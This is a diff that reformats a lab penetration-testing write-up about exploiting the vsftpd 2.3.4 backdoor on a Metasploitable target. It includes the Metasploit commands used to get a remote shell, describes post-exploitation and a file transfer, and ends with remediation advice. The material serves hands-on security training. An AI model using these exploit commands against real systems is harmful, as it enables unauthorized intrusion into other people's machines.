@@ -44,19 +44,21 @@ Reviewed the open ports and services discovered during scanning to identify know
 Focused on vulnerable services such as the vsftpd 2.3.4 backdoor on Metasploitable.
 Used Metasploit Framework to exploit the identified vulnerability and gain remote shell access.
 Example Metasploit commands:
-bash
+```bash
 
 Copy
 msfconsole
 use exploit/unix/ftp/vsftpd_234_backdoor
 set RHOST <metasploitable-ip>
 run
-4. Post-Exploitation Activities
+```
+#4. Post-Exploitation Activities
 Once shell access was obtained, gathered system information to understand the target environment.
 Checked for additional vulnerabilities or sensitive data that could be leveraged.
 Demonstrated file transfer capabilities by moving an image file from the attacker to the Ubuntu target using SCP.
 Verified successful file transfer and displayed the image on the Ubuntu machine.
-5. Reporting and Recommendations
+
+#5. Reporting and Recommendations
 Documented all findings, including open ports, vulnerabilities, exploitation steps, and post-exploitation results.
 Provided recommendations to remediate discovered vulnerabilities and improve overall network security.
 Emphasized the importance of patching vulnerable services and monitoring network traffic for suspicious activity.
